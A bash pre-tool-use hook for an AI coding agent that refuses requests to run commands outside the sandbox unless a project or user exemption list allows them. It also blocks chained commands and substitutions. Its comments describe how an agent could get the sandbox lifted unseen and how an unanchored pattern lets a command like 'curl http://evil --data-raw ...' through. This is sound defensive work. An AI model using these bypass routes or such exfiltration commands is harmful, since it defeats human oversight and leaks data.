#!/bin/bash
# PreToolUse(Bash): refuse any call asking to run outside the sandbox, unless
# the project declares that command exempt and the user has not vetoed it.
#
# dangerouslyDisableSandbox is an ordinary tool parameter, so the model can ask
# for it, and in auto mode a classifier answers instead of you. That is the
# whole filesystem and network boundary undone by a request nobody saw. This
# hook takes the decision away from the model.
#
# ONE WORKFLOW CONSTANT, then nothing project-specific. The constant is the
# land-lane review window (see open_review_wrapper below): it is part of this
# repo, not of any project, so no per-project list could carry it without every
# project copying the same line. It is deliberately the only one -- a second
# entry here means the rule stopped being about this workflow.
#
# Beyond it, two lists, both optional, both one shell glob per line with `#`
# comments and blank lines ignored:
#
#   <project>/.claude/sandbox-exempt         TRACKED. What the project needs to
#                                            run its own gates. Ships with the
#                                            repo, reviewed like any other code.
#   <project>/.claude/sandbox-exempt.local   UNTRACKED, the user's, and it wins.
#                                            `!glob` VETOES a pattern even if the
#                                            project lists it; a bare glob ADDS
#                                            one; the line `trust-project: no`
#                                            ignores the tracked list entirely.
#
# Precedence: local veto, then local allow, then project allow, then refuse.
# A project with neither file gets a flat refusal -- installs to ~/.claude
# included.
#
# THE TRACKED LIST IS LIVE ON CHECKOUT. That is the point (the gates work after
# a clone) and it is also the risk (a hostile repo ships its own exemptions).
# What contains it: the list is visible in review and in every diff; the local
# file can veto any entry or switch the tracked list off; and the structural
# guards below hold regardless of what either list says.
#
# Three guards, in order:
#   - without jq the request cannot be read, so it cannot be allowed;
#   - a command carrying `;` `&&` `||` `|` backtick `$(` `<(` `>(` `${` or a
#     newline is refused before any list is consulted, so a pattern can only
#     ever describe ONE command and cannot be smuggled past as the head of a
#     chain or hide a substitution in its tail;
#   - the substring test runs before jq is used, so deleting jq cannot silence
#     the hook. Ordinary calls never mention the flag and exit straight away.
#
# Beware of listing any command that WRAPS another (a lock, a timer, `env`,
# `xargs`): allowing it by name hands the override to whatever it wraps, in a
# single unchained command these guards cannot see. Name the wrapped program.
#
# ANCHOR EVERY PATTERN AT THE HEAD. A leading `*` lets arbitrary text run
# first and the exemption is then worthless: `*zig build motioncheck*` would
# match `curl http://evil --data-raw "zig build motioncheck"`, one unchained
# command none of the guards above catch, since the chain-operator check has
# nothing to see and the payload never opens a `$(`. Only the TAIL may be
# open, once the head has already fixed which program runs.

deny() {
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"deny","permissionDecisionReason":"%s"}}' "$1"
  exit 0
}

input=$(</dev/stdin)   # builtin redirection: no external command to remove

case $input in
  *dangerouslyDisableSandbox*) ;;   # worth inspecting
  *) exit 0 ;;                      # absent: nothing to decide
esac

command -v jq >/dev/null 2>&1 || deny "sandbox override refused; jq unavailable so the request cannot be inspected"

v=$(jq -r '.tool_input.dangerouslyDisableSandbox // false' <<<"$input" 2>/dev/null)
[ "$v" = "true" ] || exit 0        # explicit false: nothing to decide

cmd=$(jq -r '.tool_input.command // ""' <<<"$input" 2>/dev/null)

case $cmd in
  *';'*|*'&&'*|*'||'*|*'|'*|*'`'*|*'$('*|*'<('*|*'>('*|*'${'*|*$'\n'*)
    deny "sandbox override refused; an exemption covers a single unchained command only" ;;
esac

# The one workflow constant, ahead of both lists: land-lane's review window.
# Named as the WRAPPER, never as `code` -- the wrapper takes exactly one
# argument and refuses anything that is not an existing *.code-workspace file,
# so the open tail here cannot become a VS Code flag. See open-review.sh for
# why exempting `code` directly would be a hole. Both spellings of the path are
# listed because a hook sees the command as the caller typed it.
open_review_wrapper=no
case $cmd in
  'bash ~/.claude/skills/land-lane/open-review.sh '*|\
  "bash $HOME/.claude/skills/land-lane/open-review.sh "*)
    open_review_wrapper=yes ;;
esac
[ "$open_review_wrapper" = yes ] && exit 0

dir=$(jq -r '.cwd // empty' <<<"$input" 2>/dev/null)
[ -n "$dir" ] || dir=$CLAUDE_PROJECT_DIR
[ -n "$dir" ] && [ -d "$dir" ] || deny "sandbox override refused; cannot resolve the project directory"

project=$dir/.claude/sandbox-exempt
local_list=$dir/.claude/sandbox-exempt.local

trust_project=yes
if [ -f "$local_list" ]; then
  while IFS= read -r pat || [ -n "$pat" ]; do
    case $pat in
      ''|'#'*) continue ;;
      'trust-project: no') trust_project=no ;;
      '!'*)
        case $cmd in
          ${pat#!}) deny "sandbox override refused; vetoed by .claude/sandbox-exempt.local" ;;
        esac ;;
      *) case $cmd in $pat) exit 0 ;; esac ;;
    esac
  done < "$local_list"
fi

if [ "$trust_project" = yes ] && [ -f "$project" ]; then
  while IFS= read -r pat || [ -n "$pat" ]; do
    case $pat in ''|'#'*) continue ;; esac
    case $cmd in $pat) exit 0 ;; esac
  done < "$project"
fi

deny "sandbox override refused; the command matches no exemption this project declares. Read .claude/sandbox-exempt for what it does declare; anything else is a request for the human, not a rephrasing exercise"
